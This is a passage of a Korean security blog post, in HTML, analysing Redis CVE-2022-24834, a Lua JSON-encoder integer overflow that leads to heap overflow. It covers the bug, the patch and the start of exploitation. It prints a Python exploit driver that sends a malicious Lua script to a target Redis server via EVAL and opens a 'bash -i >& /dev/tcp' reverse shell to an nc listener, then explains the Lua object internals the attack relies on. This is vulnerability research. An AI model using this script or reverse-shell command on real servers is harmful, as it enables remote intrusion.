&#xD638;&#xCD9C;&#xC5D0; &#xC0AC;&#xC6A9;&#xD55C; <code>size_t</code> &#xC790;&#xB8CC;&#xD615;&#xC778; <code>len * 6 + 2</code>&#xAC00; <code>int</code> &#xC790;&#xB8CC;&#xD615;&#xC73C;&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xB41C; &#xAC83;&#xC774; &#xC6D0;&#xC778;&#xC785;&#xB2C8;&#xB2E4;. </p><p><code>size_t</code> &#xC790;&#xB8CC;&#xD615;&#xC778; <code>json_append_string</code>&#xD568;&#xC218;&#xC758; <code>len * 6 + 2</code>&#xAC00; <code>strbuf_ensure_empty_length</code>&#xC758; <code>int len</code>&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xBA74;&#xC11C; 64&#xBE44;&#xD2B8; &#xD06C;&#xAE30;&#xC778; <code>size_t</code>&#xC5D0;&#xC11C; 32&#xBE44;&#xD2B8; &#xD06C;&#xAE30;&#xC778; <code>int</code>&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xC5F0;&#xC0B0; &#xACB0;&#xACFC;&#xC758; &#xC0C1;&#xC704; 32&#xBE44;&#xD2B8;&#xB294; &#xC0AC;&#xB77C;&#xC9C0;&#xAC8C; &#xB418;&#xACE0; &#xB9CC;&#xC57D; <code>len * 6 + 2</code>&#xAC00; 32&#xBE44;&#xD2B8;&#xB85C; &#xC804;&#xBD80; &#xD45C;&#xD604;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xAC12;&#xC774;&#xB77C;&#xBA74; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xACE0; &#xC758;&#xB3C4;&#xD55C; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xC791;&#xC740; &#xBC84;&#xD37C;&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xAC8C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p> &#xC774;&#xB85C; &#xC778;&#xD574; <code>[3]</code> &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xC778;&#xCF54;&#xB529;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBC84;&#xD37C;&#xC5D0; &#xC4F8; &#xB54C; Heap Overflow&#xAE4C;&#xC9C0; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h1 id="3-&#xD328;&#xCE58;-&#xBD84;&#xC11D;"><a href="#3-&#xD328;&#xCE58;-&#xBD84;&#xC11D;" class="headerlink" title="3. &#xD328;&#xCE58; &#xBD84;&#xC11D;"></a>3. &#xD328;&#xCE58; &#xBD84;&#xC11D;</h1><hr><p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xC55E;&#xC11C; &#xC5B4;&#xB5BB;&#xAC8C; &#xD328;&#xCE58;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xB294;&#xC9C0; &#xBD84;&#xC11D;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Redis &#xBC84;&#xC804; <a href="https://github.com/redis/redis/pull/12401/commits/5c5441d16682803ebf8de9ebd8d438517aef9d89">7.0.12</a>, <a href="https://github.com/redis/redis/pull/12400/commits/e47c1f5f7bc150b0c1774b65bc2dba7e116da4f0#diff-dd930db7f554182383e7581313c58c5a4fe4ee88dbd9b448f056f070bbb62336">6.2.13</a>, <a href="https://github.com/redis/redis/pull/12399/commits/8e97274dd5be535033e7f31cd0cd99cf37e1cb0b">6.0.20</a> &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC624;&#xD508;&#xC18C;&#xC2A4;&#xB77C; &#xADF8;&#xB7F0;&#xC9C0; &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;&#xB3C4; &#xADF8;&#xB807;&#xACE0; &#xC5EC;&#xB7EC;&#xBAA8;&#xB85C; &#xD3B8;&#xB9AC;&#xD558;&#xB124;&#xC694;.</p><p><img src="/2024/08/18/pwndorei/1day1document_CVE-2022-24834/image.png" alt="image.png"></p><blockquote><p><del>&#xC0AC;&#xC2E4; IDA&#xB85C; &#xBCF4;&#xB294;&#xAC8C; &#xB354; &#xC7AC;&#xBC0C;&#xC74C;</del></p></blockquote><h2 id="json-append-string-Patched"><a href="#json-append-string-Patched" class="headerlink" title="json_append_string : Patched"></a><code>json_append_string</code> : Patched</h2><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">json_append_string</span><span class="hljs-params">(lua_State *l, <span class="hljs-keyword">strbuf_t</span> *json, <span class="hljs-keyword">int</span> lindex)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *escstr;    <span class="hljs-keyword">int</span> i;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *str;    <span class="hljs-keyword">size_t</span> len;    str = lua_tolstring(l, lindex, &amp;len);    <span class="hljs-comment">/* Worst case is len * 6 (all unicode escapes).</span><span class="hljs-comment">     * This buffer is reused constantly for small strings</span><span class="hljs-comment">     * If there are any excess pages, they won&apos;t be hit anyway.</span><span class="hljs-comment">     * This gains ~5% speedup. */</span>    <span class="hljs-keyword">if</span> (len &gt; SIZE_MAX / <span class="hljs-number">6</span> - <span class="hljs-number">3</span>) <span class="hljs-comment">// [1]</span>        <span class="hljs-built_in">abort</span>(); <span class="hljs-comment">/* Overflow check */</span>    strbuf_ensure_empty_length(json, len * <span class="hljs-number">6</span> + <span class="hljs-number">2</span>);    strbuf_append_char_unsafe(json, <span class="hljs-string">&apos;\&quot;&apos;</span>);    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++) {        escstr = char2escape[(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)str[i]];        <span class="hljs-keyword">if</span> (escstr)            strbuf_append_string(json, escstr);        <span class="hljs-keyword">else</span>            strbuf_append_char_unsafe(json, str[i]);    }    strbuf_append_char_unsafe(json, <span class="hljs-string">&apos;\&quot;&apos;</span>);}</code></pre><p><code>json_append_string</code> &#xD568;&#xC218;&#xB294; <code>[1]</code>&#xC5D0;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xB294; &#xAC83;&#xCC98;&#xB7FC; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCD94;&#xAC00;&#xB41C; &#xBD80;&#xBD84;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC5D0; &#xB530;&#xB77C; 64&#xBE44;&#xD2B8;&#xB098; 32&#xBE44;&#xD2B8;&#xC758; unsigned integer&#xC758; &#xCD5C;&#xB313;&#xAC12;&#xC73C;&#xB85C; &#xC815;&#xC758;&#xB418;&#xB294; <code>SIZE_MAX</code>&#xB97C; 6&#xC73C;&#xB85C; &#xB098;&#xB204;&#xACE0; 3&#xC744; &#xBE80; &#xAC12;&#xACFC; <code>len</code>&#xC744; &#xBE44;&#xAD50;&#xD569;&#xB2C8;&#xB2E4;.</p><p> &#xB9CC;&#xC57D; <code>len</code>&#xC774; &#xB354; &#xD06C;&#xB2E4;&#xBA74; <code>strbuf_ensure_empty_length</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xC704;&#xD574; <code>len * 6 + 2</code>&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>abort()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC885;&#xB8CC;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="strbuf-ensure-empty-length-Patched"><a href="#strbuf-ensure-empty-length-Patched" class="headerlink" title="strbuf_ensure_empty_length : Patched"></a><code>strbuf_ensure_empty_length</code> : Patched</h2><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">strbuf_ensure_empty_length</span><span class="hljs-params">(<span class="hljs-keyword">strbuf_t</span> *s, <span class="hljs-keyword">size_t</span> len)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">if</span> (len &gt; strbuf_empty_length(s))        strbuf_resize(s, s-&gt;length + len);}</code></pre><p><code>strbuf_ensure_empty_length</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC778; <code>len</code>&#xC758; &#xC790;&#xB8CC;&#xD615;&#xC774; <code>int</code>&#xC5D0;&#xC11C; <code>size_t</code>&#xB85C; &#xBCC0;&#xACBD;&#xB418;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xAE30;&#xC874;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC73C;&#xB85C;&#xB294; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; &#xB418;&#xC5C8;&#xACE0; <code>strbuf_empty_length</code> &#xB610;&#xD55C; <code>size_t</code>&#xB97C; &#xBC18;&#xD658;&#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xD328;&#xCE58; &#xC774;&#xD6C4; Integer Overflow&#xB97C; &#xC720;&#xBC1C;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; 64&#xBE44;&#xD2B8;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xAE38;&#xC774;&#xAC00; &#xB300;&#xB7B5; 0x2AAAAAAAAAAAAAAB&#xC778; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC804;&#xB2EC;&#xD574;&#xC57C; &#xD558;&#xACE0; &#xC774;&#xB294; &#xC2E4;&#xC6A9;&#xC801;&#xC774;&#xC9C0; &#xBABB;&#xD558;&#xBA70; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB354;&#xB77C;&#xB3C4; <code>json_append_string</code>&#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD0D0;&#xC9C0;&#xB418;&#xC5B4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC885;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC678;&#xC5D0;&#xB3C4; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xC720;&#xC0AC;&#xD558;&#xAC70;&#xB098; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xB294; &#xBD80;&#xBD84;&#xC5D0; Integer Overflow&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xAC70;&#xB098; <code>int</code> &#xC790;&#xB8CC;&#xD615;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB358; &#xBD80;&#xBD84;&#xC774; <code>size_t</code> &#xB098; &#xB2E4;&#xB978; 64&#xBE44;&#xD2B8; &#xC815;&#xC218; &#xC790;&#xB8CC;&#xD615;&#xC73C;&#xB85C; &#xB300;&#xCCB4;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="4-Exploitation"><a href="#4-Exploitation" class="headerlink" title="4. Exploitation"></a>4. Exploitation</h1><hr><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74; Heap Corruption&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xCF1C; Denial of Service&#xB098; &#xD799;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; Lua Object&#xB97C; &#xB36E;&#xC5B4;&#xC4F0;&#xACE0; Fake Object&#xB97C; &#xAD6C;&#xC131;&#xD558;&#xC5EC; Remote Code Execution&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; Redis Server&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xACE0; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC804;&#xC1A1;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; python&#xCF54;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-comment"># redis_cve-2022-24834.py</span><span class="hljs-keyword">import</span> pwn<span class="hljs-keyword">import</span> threading<span class="hljs-keyword">import</span> subprocess<span class="hljs-keyword">import</span> syspwn.context.log_level = <span class="hljs-string">&quot;debug&quot;</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Redis</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, host=<span class="hljs-string">&apos;192.168.45.250&apos;</span>, port=<span class="hljs-number">6379</span></span>):</span>        self.host = host        self.port = port        self.conn = <span class="hljs-literal">None</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prepare</span>(<span class="hljs-params">self, data</span>):</span>        <span class="hljs-keyword">if</span> isinstance(data, int):            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;:<span class="hljs-subst">{data}</span>\r\n&quot;</span>.encode()        <span class="hljs-keyword">elif</span> isinstance(data, str):            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;$<span class="hljs-subst">{len(data)}</span>\r\n<span class="hljs-subst">{data}</span>\r\n&quot;</span>.encode()        <span class="hljs-keyword">elif</span> isinstance(data, bytes):            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;$<span class="hljs-subst">{len(data)}</span>\r\n&quot;</span>.encode() + data + <span class="hljs-string">b&quot;\r\n&quot;</span>        <span class="hljs-keyword">elif</span> isinstance(data, list):            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;*<span class="hljs-subst">{len(data)}</span>\r\n&quot;</span>.encode() + <span class="hljs-string">b&apos;&apos;</span>.join([self.prepare(elm) <span class="hljs-keyword">for</span> elm <span class="hljs-keyword">in</span> data])        <span class="hljs-keyword">elif</span> data <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:            <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;$-1\r\n&quot;</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;Non-RESP type: <span class="hljs-subst">{type(data)}</span>&quot;</span>)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd</span>(<span class="hljs-params">self, argv</span>):</span>        self.conn = pwn.remote(self.host, self.port)        self.conn.send(self.prepare(argv))        <span class="hljs-comment">#self.conn.interactive()</span>        <span class="hljs-keyword">return</span> self.recv()    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recv</span>(<span class="hljs-params">self</span>):</span>        t = self.conn.recv(<span class="hljs-number">1</span>)        <span class="hljs-keyword">if</span> t == <span class="hljs-string">b&apos;+&apos;</span> <span class="hljs-keyword">or</span> t == <span class="hljs-string">b&apos;-&apos;</span>:            <span class="hljs-keyword">return</span> self.conn.recvuntil(<span class="hljs-string">b&quot;\r\n&quot;</span>)[:<span class="hljs-number">-2</span>]        <span class="hljs-keyword">elif</span> t == <span class="hljs-string">b&apos;:&apos;</span>:            <span class="hljs-keyword">return</span> int(self.conn.recvuntil(<span class="hljs-string">b&quot;\r\n&quot;</span>)[:<span class="hljs-number">-2</span>])        <span class="hljs-keyword">elif</span> t == <span class="hljs-string">b&apos;$&apos;</span>:            s = int(self.conn.recvuntil(<span class="hljs-string">b&quot;\r\n&quot;</span>)[:<span class="hljs-number">-2</span>])            <span class="hljs-keyword">if</span> s == <span class="hljs-number">-1</span>:                <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>            d = self.conn.recv(s)            self.conn.recvuntil(<span class="hljs-string">b&quot;\r\n&quot;</span>)            <span class="hljs-keyword">return</span> d        <span class="hljs-keyword">elif</span> t == <span class="hljs-string">b&apos;*&apos;</span>:            s = int(self.conn.recvuntil(<span class="hljs-string">b&quot;\r\n&quot;</span>)[:<span class="hljs-number">-2</span>])            <span class="hljs-keyword">return</span> [redis_recv(sock) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(s)]        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;What is this? <span class="hljs-subst">{t}</span>&quot;</span>)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GET</span>(<span class="hljs-params">self, key</span>):</span>        <span class="hljs-keyword">return</span> self.cmd([<span class="hljs-string">&quot;GET&quot;</span>, key])    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">EVAL</span>(<span class="hljs-params">self, script</span>):</span>        <span class="hljs-keyword">return</span> self.cmd([<span class="hljs-string">&quot;EVAL&quot;</span>, script, <span class="hljs-string">&quot;0&quot;</span>])<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShellServer</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, lport=<span class="hljs-number">4444</span>, lhost=<span class="hljs-string">&apos;0.0.0.0&apos;</span></span>):</span>        self.lhost = lhost        self.lport = lport    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span>        <span class="hljs-comment">#l = pwn.listen(self.lport, self.lhost)</span>        <span class="hljs-comment">#target = l.wait_for_connection()</span>        <span class="hljs-comment">#target.interactive()</span>        subprocess.run([<span class="hljs-string">&quot;nc&quot;</span>, <span class="hljs-string">&quot;-lnvp&quot;</span>, str(self.lport)])<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    <span class="hljs-keyword">if</span> len(sys.argv) != <span class="hljs-number">6</span>:        print(<span class="hljs-string">f&quot;USAGE: python <span class="hljs-subst">{sys.argv[<span class="hljs-number">0</span>]}</span> redis_host redis_port listen_host listen_port script_file&quot;</span>)        sys.exit(<span class="hljs-number">-1</span>)    redis_host, redis_port, lhost, lport, lua_script = sys.argv[<span class="hljs-number">1</span>:]        debug = <span class="hljs-literal">False</span>    print(<span class="hljs-string">f&quot;[*] Starting server on <span class="hljs-subst">{lhost}</span>:<span class="hljs-subst">{lport}</span>&quot;</span>)    shell_server = ShellServer(lport)    shell_server = threading.Thread(target=ShellServer().run)    shell_server.start()    print(<span class="hljs-string">f&quot;[*] Sending evil lua script to <span class="hljs-subst">{redis_host}</span>:<span class="hljs-subst">{redis_port}</span>&quot;</span>)    redis = Redis(redis_host, redis_port)    cmd = <span class="hljs-string">f&quot;bash -c &apos;bash -i &gt;&amp; /dev/tcp/<span class="hljs-subst">{lhost}</span>/<span class="hljs-subst">{lport}</span> 0&gt;&amp;1&apos;&quot;</span>.encode()    evil_lua_script = open(lua_script, <span class="hljs-string">&quot;rb&quot;</span>).read().replace(<span class="hljs-string">b&quot;[CMD]&quot;</span>, cmd)    r = redis.EVAL(evil_lua_script)    <span class="hljs-keyword">if</span> debug:        <span class="hljs-keyword">if</span> r: print(repr(r))<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    main()</code></pre><p>&#xC704; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB294; &#xBA85;&#xB839;&#xC904; &#xC778;&#xC790;&#xB85C; &#xBC1B;&#xC740; &#xACF5;&#xACA9;&#xD560; Redis Server&#xC758; IP &#xC8FC;&#xC18C;&#xC640; port&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC11C;&#xBC84;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xACE0; RCE&#xB85C; &#xC2E4;&#xD589;&#xD55C; &#xB9AC;&#xBC84;&#xC2A4;&#xC258;&#xC744; &#xC704;&#xD574; listen&#xD560; host&#xC640; port&#xB97C; &#xC9C0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xB9C8;&#xC9C0;&#xB9C9; &#xC778;&#xC790;&#xB85C;&#xB294; &#xC2E4;&#xD589;&#xD560; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xC5EC; &#xC811;&#xC18D;&#xD55C; Redis Server&#xC5D0;&#xC11C; <code>EVAL</code> &#xCEE4;&#xB9E8;&#xB4DC;&#xB85C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Remote-Code-Execution-Redis-Version-6-2-12-amp-7-0-11"><a href="#Remote-Code-Execution-Redis-Version-6-2-12-amp-7-0-11" class="headerlink" title="Remote Code Execution : Redis Version 6.2.12 &amp; 7.0.11"></a>Remote Code Execution : Redis Version 6.2.12 &amp; 7.0.11</h2><p>&#xADF8;&#xB7FC; &#xBA3C;&#xC800; Redis 6.2.12&#xC640; 7.0.11&#xC5D0;&#xC11C;&#xC758; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;!</p><h3 id="&#xC81C;&#xC57D;&#xC0AC;&#xD56D;"><a href="#&#xC81C;&#xC57D;&#xC0AC;&#xD56D;" class="headerlink" title="&#xC81C;&#xC57D;&#xC0AC;&#xD56D;"></a>&#xC81C;&#xC57D;&#xC0AC;&#xD56D;</h3><p>RCE &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xC704;&#xD574; &#xACE0;&#xB824;&#xD574;&#xC57C; &#xD560; &#xC0AC;&#xD56D;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xACFC;&#xB3C4;&#xD55C; Heap Corruption</li><li>Unicode escape&#xB41C; &#xB370;&#xC774;&#xD130;&#xC640; &#xC591; &#xB05D;&#xC758; &#xC81C;&#xC5B4; &#xBD88;&#xAC00;&#xB2A5;&#xD55C; double quote</li><li>ASLR &amp; PIE</li></ol><p>&#xCCAB; &#xBC88;&#xC9F8;&#xB85C; Integer Overflow&#xC758; &#xACB0;&#xACFC; &#xB300;&#xB7C9;&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; Overwrite&#xB418;&#xAE30;&#xC5D0; RCE&#xB97C; &#xB2EC;&#xC131;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC704;&#xD5D8;&#xC774; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xC4F0;&#xC774;&#xB294; &#xB370;&#xC774;&#xD130;&#xB294; unicode escape&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC644;&#xC804;&#xD788; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xAC83;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xACE0; &#xB370;&#xC774;&#xD130;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9;&#xC740; &#xD56D;&#xC0C1; <code>&quot;</code>(0x22)&#xB85C; &#xB05D;&#xB098;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; redis-server &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; PIE&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xACE0; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; ASLR&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xACBD;&#xC6B0; address leak&#xC774; &#xC694;&#xAD6C;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC740; <a href="https://hackyboiz.github.io/2024/08/04/pwndorei/1day1document_CVE-2023-21608/">&#xC774;&#xC804; &#xAE00;</a>&#xC5D0;&#xC11C; javascript&#xB97C; &#xC0AC;&#xC6A9;&#xD55C; &#xAC83;&#xCC98;&#xB7FC; Lua&#xC758; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xBCC0;&#xC870;&#xD574;&#xC11C; &#xC784;&#xC758; &#xC8FC;&#xC18C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xB4F1;&#xC758; primitive&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xD65C;&#xC6A9;&#xD574;&#xC11C; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C;&#xB294; Fake Closure object&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="1-Partial-Overwrite-Table-array"><a href="#1-Partial-Overwrite-Table-array" class="headerlink" title="1. Partial Overwrite Table.array"></a>1. Partial Overwrite <code>Table.array</code></h3><p>Overflow&#xB420; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC628;&#xC804;&#xD788; &#xC81C;&#xC5B4;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xAE30;&#xC5D0; Partial Overwrite&#xB85C; Lua&#xC758; <code>Table</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC758; <code>array</code> &#xD544;&#xB4DC;&#xB97C; &#xC870;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Lua&#xC758; &#xBAA8;&#xB4E0; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB294; &#xC544;&#xB798;&#xC758; <code>TValue</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xC758;&#xD574; &#xAD00;&#xB9AC;&#xB418;&#xACE0; Lua&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xBCC0;&#xC218;&#xB97C; &#xB2E4;&#xB8E8;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">union</span> {  GCObject *gc;  <span class="hljs-keyword">void</span> *p;  lua_Number n;  <span class="hljs-keyword">int</span> b;} Value;<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TValuefieldsValue value; int tt</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">lua_TValue</span> {</span>  TValuefields;} TValue;</code></pre><p><code>int tt</code> &#xD544;&#xB4DC;&#xB294; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC758; &#xD0C0;&#xC785;&#xC744; &#xB098;&#xD0C0;&#xB0B4;&#xBA70; &#xC544;&#xB798;&#xC758; &#xAC12; &#xC911; &#xD558;&#xB098;&#xB85C; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LUA_TNONE(-1)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LUA_TNIL0</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LUA_TBOOLEAN1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LUA_TLIGHTUSERDATA2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LUA_TNUMBER3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LUA_TSTRING4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LUA_TTABLE5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LUA_TFUNCTION6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LUA_TUSERDATA7</span><span class="hljs-meta">#<span 